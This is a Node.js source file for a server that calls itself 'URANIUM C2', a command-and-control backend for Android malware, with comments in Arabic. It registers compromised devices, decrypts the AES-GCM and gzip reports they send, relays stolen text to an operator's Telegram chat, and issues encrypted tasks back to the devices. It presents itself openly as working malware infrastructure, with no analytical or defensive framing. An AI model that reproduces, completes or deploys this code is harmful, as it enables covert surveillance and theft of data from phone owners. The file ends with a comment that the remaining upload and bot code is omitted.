require('dotenv').config();
const express = require('express');
const telegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const sqlite3 = require('sqlite3').verbose();
const zlib = require('zlib');

const TOKEN = process.env.TG_TOKEN;
const CHAT_ID = process.env.TG_ID;

if (!TOKEN || !CHAT_ID) {
    console.error('[-] Missing env: TG_TOKEN, TG_ID');
    process.exit(1);
}

const STORAGE_DIR = path.join(__dirname, 'uranium_storage');
fs.mkdirSync(STORAGE_DIR, { recursive: true });

// مسح الداتابيز القديمة عشان نبدأ نضيف
try {
    if (fs.existsSync('./uranium_core_v21.db')) {
        fs.unlinkSync('./uranium_core_v21.db');
        console.log('[DB] Old database deleted.');
    }
} catch (e) {
    console.error('[DB] Failed to delete old database:', e.message);
}

const db = new sqlite3.Database('./uranium_core_v21.db');

db.on('error', (err) => {
    console.error('[DB ERROR]', err.message);
});

db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS nodes (
        id TEXT PRIMARY KEY,
        model TEXT,
        android_sdk INTEGER,
        last_seen INTEGER,
        online INTEGER DEFAULT 0,
        secret_hash TEXT
    )`);
    db.run(`CREATE TABLE IF NOT EXISTS tasks (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        node_id TEXT,
        action TEXT,
        payload TEXT,
        status TEXT DEFAULT 'PENDING',
        created_at INTEGER,
        sent_at INTEGER
    )`);
});

const app = express();
const appBot = new telegramBot(TOKEN, { polling: { interval: 1500, autoStart: true } });

app.use(express.json({ limit: '100mb' }));
app.use('/api/v3/uranium/upload_raw', express.raw({ type: 'application/octet-stream', limit: '120mb' }));

app.use((err, req, res, next) => {
    console.error('Express:', err.message);
    if (res.headersSent) return next(err);
    res.status(400).json({ error: 'BAD_REQUEST', detail: err.message });
});

let tgQueue = Promise.resolve();
function sendTg(msg, options = {}) {
    tgQueue = tgQueue.then(() => appBot.sendMessage(CHAT_ID, msg, { parse_mode: 'HTML', ...options }))
        .catch(e => console.error('TG:', e.message));
    return tgQueue;
}

function escapeHtml(s) {
    return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

function hashSecret(s) {
    if (!s) return null;
    return crypto.createHash('sha256').update(String(s)).digest('hex');
}

// === دوال فك التشفير (مطابقة للاندرويد) ===
function getKey(secret) {
    const raw = secret ? `${secret}|uranium-v27` : 'fallback|uranium-v27';
    return crypto.createHash('sha256').update(raw).digest();
}

function decryptPayload(b64, secret) {
    try {
        const pkt = JSON.parse(Buffer.from(b64.trim(), 'base64').toString('utf8'));
        const iv = Buffer.from(pkt.v, 'hex');
        const tag = Buffer.from(pkt.g, 'hex');
        const data = Buffer.from(pkt.d, 'hex');
        const decipher = crypto.createDecipheriv('aes-256-gcm', getKey(secret), iv);
        decipher.setAuthTag(tag);
        let dec = Buffer.concat([decipher.update(data), decipher.final()]);
        // GZIP decompress
        dec = zlib.gunzipSync(dec);
        return JSON.parse(dec.toString('utf8'));
    } catch (e) {
        return null;
    }
}

function encryptPayload(obj, secret) {
    try {
        const plain = JSON.stringify(obj);
        const compressed = zlib.gzipSync(Buffer.from(plain, 'utf8'));
        const iv = crypto.randomBytes(12);
        const cipher = crypto.createCipheriv('aes-256-gcm', getKey(secret), iv);
        const enc = Buffer.concat([cipher.update(compressed), cipher.final()]);
        const tag = cipher.getAuthTag();
        const pkt = {
            v: iv.toString('hex'),
            g: tag.toString('hex'),
            d: enc.toString('hex')
        };
        return Buffer.from(JSON.stringify(pkt)).toString('base64');
    } catch (e) {
        return null;
    }
}

app.get('/', (req, res) => {
    res.type('html').send(`<html><body style="background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:80px;"><h1>[☢️] URANIUM C2 v21.0 — Hardened [☢️]</h1></body></html>`);
});

app.post('/api/v3/uranium/stream', (req, res) => {
    const nodeId = String(req.headers['x-node-id'] || '').slice(0, 128) || 'unknown';
    const nodeModel = String(req.headers['x-node-model'] || 'Unknown').slice(0, 128);
    const sdk = parseInt(req.headers['x-android-sdk'] || '0') || 0;
    const secretHeader = req.headers['x-device-secret'] || null;
    const secretHash = hashSecret(secretHeader);

    let payload = req.body;
    // لو الـ body عبارة عن string (Base64), نفك التشفير
    if (typeof req.body === 'string') {
        payload = decryptPayload(req.body, secretHeader);
    }

    if (!payload) {
        return res.status(400).send('BAD_PAYLOAD');
    }

    db.get(`SELECT secret_hash FROM nodes WHERE id=?`, [nodeId], (_, existing) => {
        if (existing && existing.secret_hash && secretHash && existing.secret_hash !== secretHash) {
            return res.status(403).json({ status: 'AUTH_FAIL' });
        }
        db.run(`INSERT INTO nodes (id, model, android_sdk, last_seen, online, secret_hash)
            VALUES (?,?,?,?,1,COALESCE(?, secret_hash))
            ON CONFLICT(id) DO UPDATE SET
                model=excluded.model,
                android_sdk=excluded.android_sdk,
                last_seen=excluded.last_seen,
                online=1,
                secret_hash=COALESCE(excluded.secret_hash, nodes.secret_hash)`,
            [nodeId, nodeModel, sdk, Date.now(), secretHash], (err) => {
                if (err) console.error('[DB INSERT NODE]', err.message);
            });
    });

    if (payload.type === 'TEXT_REPORT') {
        const text = String(payload.data || '').substring(0, 3800);
        if (text.length > 2) sendTg(`☢️ <b>[${escapeHtml(nodeId)} | ${escapeHtml(nodeModel)}]</b>\n<pre>${escapeHtml(text)}</pre>`);
        return res.json({ status: 'ACK', task: null });
    }
    if (payload.type === 'TASK_RESULT') {
        if (Number.isInteger(payload.taskId)) {
            db.run(`UPDATE tasks SET status='DONE' WHERE id=?`, [payload.taskId]);
        }
        return res.json({ status: 'ACK', task: null });
    }

    db.get(`SELECT * FROM tasks WHERE node_id=? AND status='PENDING' ORDER BY id ASC LIMIT 1`, [nodeId], (err, row) => {
        if (err || !row) return res.json({ status: 'ACK', task: null });
        db.run(`UPDATE tasks SET status='SENT', sent_at=? WHERE id=?`, [Date.now(), row.id]);
        let parsed = {};
        try { parsed = JSON.parse(row.payload || '{}'); } catch (_) {}
        
        // تشفير الرد
        const responseObj = { status: 'ACK', task: { id: row.id, action: row.action, payload: parsed } };
        const encrypted = encryptPayload(responseObj, secretHeader);
        res.send(encrypted);
    });
});

// ... باقي الكود (upload, bot, ...) زي ما هو
